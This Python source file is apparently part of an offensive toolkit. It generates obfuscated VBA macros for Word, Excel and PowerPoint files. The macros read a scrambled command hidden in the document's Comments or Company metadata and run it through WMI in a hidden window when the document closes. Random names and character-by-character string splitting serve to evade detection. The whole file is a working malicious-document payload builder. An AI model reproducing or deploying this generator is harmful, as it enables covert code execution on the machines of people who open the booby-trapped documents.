# -*- coding: utf-8 -*-
import random
import string
import base64

def randomString():
    return ''.join([random.choice(string.ascii_letters) for n in range(12)])

def generateKey():
    keys = "!#+%&/()=?_-*[]{}$><"
    return ''.join(random.sample(keys,len(keys)))

def generateCmd(vbaKey, vbaCommand):
    return vbaKey.join([vbaCommand[i:i+1] for i in range(0, len(vbaCommand), 1)])

def generateVBALauncher(vbaFileType, vbaCommand, vbaMetaName):

    if vbaFileType == "word":
        vbaFileType = "ActiveDocument"
    elif vbaFileType == "excel":
        vbaFileType = "ActiveWorkbook"
    elif vbaFileType == "powerpoint":
        vbaFileType = "ActivePresentation"

    if vbaMetaName == "Comments":
        vbaMetaName = "C\"&\"o\"&\"m\"&\"m\"&\"e\"&\"n\"&\"t\"&\"s"
    elif vbaMetaName == "Company":
        vbaMetaName = "C\"&\"o\"&\"m\"&\"p\"&\"a\"&\"n\"&\"y"

    vbaCommandKey = generateKey()
    vbaBaseCmd = generateCmd(vbaCommandKey, vbaCommand)
    vbaBaseCode = '''Sub Auto_Close()
    {0}
End Sub

Sub AutoClose()
    {0}
End Sub

Public Function {0}() As Variant
    Dim {1} As DocumentProperty
    For Each {1} In {8}.BuiltInDocumentProperties
        If {1}.Name = "{10}" Then
            Dim {2} As String
            {2} = Replace({1}.Value, "{9}", "")
            Const HIDDEN_WINDOW = 0
            Set {3} = GetObject("w"&"i"&"n"&"m"&"g"&"m"&"t"&"s"&":"&"\\"&"\\"&"."&"\\"&"r"&"o"&"o"&"t"&"\\"&"c"&"i"&"m"&"v"&"2")
            Set {4} = {3}.Get("W"&"i"&"n"&"3"&"2"&"_"&"P"&"r"&"o"&"c"&"e"&"s"&"s"&"S"&"t"&"a"&"r"&"t"&"u"&"p")
            Set {5} = {4}.SpawnInstance_
            {5}.ShowWindow = HIDDEN_WINDOW
            Set {6} = GetObject("w"&"i"&"n"&"m"&"g"&"m"&"t"&"s"&":"&"\\"&"\\"&"."&"\\"&"r"&"o"&"o"&"t"&"\\"&"c"&"i"&"m"&"v"&"2"&":"&"W"&"i"&"n"&"3"&"2"&"_"&"P"&"r"&"o"&"c"&"e"&"s"&"s")
            {6}.Create {2}, Null, {5}, {7}
        End If
    Next
End Function'''

    loaderFinal = "'\n'Insert the following string to \""+vbaMetaName.replace("\"&\"", "")+"\" meta data section of file:\n'" + vbaBaseCmd + "\n'\n\n"
    loaderFinal += vbaBaseCode.format(randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), randomString(), vbaFileType, vbaCommandKey, vbaMetaName)
    return loaderFinal
